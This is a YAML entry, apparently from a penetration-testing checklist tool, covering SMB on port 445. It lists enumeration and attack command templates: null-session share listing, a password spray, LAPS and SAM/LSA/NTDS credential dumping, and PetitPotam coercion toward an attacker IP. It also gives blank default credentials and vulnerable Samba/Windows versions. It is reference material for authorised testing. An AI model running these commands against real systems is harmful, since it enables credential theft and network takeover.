schema_version: 1
port: 445
service: smb
protocol: tcp
risk: high
aliases:
  - microsoft-ds
  - netbios-ssn
quick_facts:
  - "SMB exposes Windows file sharing, named pipes, and IPC$"
  - "Always check null sessions, signing requirement, and SMBv1 status"
  - "EternalBlue (MS17-010) is a default check on legacy Windows"
checks:
  - key: smb-null-session
    label: "Tested null session (anonymous IPC$ access)"
  - key: smb-signing
    label: "Checked SMB signing requirement (disabled = relay candidate)"
  - key: smb-version
    label: "Identified SMB dialect (v1/v2/v3) and OS version"
  - key: smb-enum-shares
    label: "Enumerated shares and access permissions"
  - key: smb-eternalblue
    label: "Tested for MS17-010 EternalBlue"
  - key: smb-enum-users
    label: "Enumerated users via RID cycling"
  - key: smb-pass-pol
    label: "Pulled domain password policy (lockout threshold + min length)"
  - key: smb-password-spray
    label: "Performed password spray with discovered users (within lockout safety)"
  - key: smb-laps-dump
    label: "Tested LAPS read access (ms-Mcs-AdmPwd attribute)"
  - key: smb-secretsdump
    label: "Dumped SAM / LSA secrets after gaining administrative access"
  - key: smb-coerce
    label: "Attempted coercion (PetitPotam, PrinterBug) for relay / NetNTLMv2 capture"
commands:
  - label: "Enumerate shares (null session)"
    template: "smbclient -L //{IP}/ -N"
  - label: "nmap SMB scripts"
    template: "nmap -p{PORT} --script=smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln-ms17-010 {IP}"
  - label: "enum4linux-ng"
    template: "enum4linux-ng -A {IP}"
  - label: "smbmap shares + permissions"
    template: "smbmap -H {IP} -P {PORT}"
  - label: "crackmapexec enumerate (legacy)"
    template: "crackmapexec smb {IP} -u '' -p ''"
  - label: "netexec / nxc null-session enum"
    template: "nxc smb {IP} -u '' -p '' --shares --users --pass-pol"
  - label: "netexec password spray"
    template: "nxc smb {IP} -u users.txt -p 'Spring2025!' --continue-on-success"
  - label: "netexec LAPS dump (with creds)"
    template: "nxc smb {IP} -u <user> -p <pass> --laps"
  - label: "netexec secretsdump (admin creds)"
    template: "nxc smb {IP} -u administrator -p <pass> --sam --lsa --ntds"
  - label: "impacket-secretsdump (DA / DCSync)"
    template: "impacket-secretsdump <DOMAIN>/<user>:<pass>@{IP}"
  - label: "rpcclient null session"
    template: "rpcclient -U '' -N {IP}"
  - label: "PetitPotam coercion (relay listener required)"
    template: "python3 PetitPotam.py <attacker-ip> {IP}"
default_creds:
  - username: guest
    password: ""
    notes: "Anonymous/null session — often disabled but worth a try"
  - username: administrator
    password: ""
    notes: "Empty password sometimes works on misconfigured installs"
known_vulns:
  # Match strings are substring-tested against nmap's `<product> <version>`
  # concat. nmap emits "Samba smbd <version>" as the product blob, so the
  # patterns below include "smbd" to avoid false positives on unrelated
  # products that happen to start with "Samba".
  - match: "Windows Server 2008"
    note: "EternalBlue (MS17-010) — wormable SMBv1 RCE"
    link: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
  - match: "smbd 3.0.20"
    note: "Username map script command injection (CVE-2007-2447) — exploits MS-RPC SamrChangePassword"
    link: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
  - match: "smbd 4.5"
    note: "SambaCry / EternalRed (CVE-2017-7494) RCE via writable share"
    link: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
  - match: "smbd 4.6.0"
    note: "SambaCry / EternalRed (CVE-2017-7494) RCE — affected through 4.6.4"
    link: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
resources:
  - title: "445 - Pentesting SMB"
    url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
    author: HackTricks
  - title: "NetBIOS / SMB Cheatsheet"
    url: "https://book.hacktricks.xyz/network-services-pentesting/137-138-139-pentesting-netbios"
    author: HackTricks
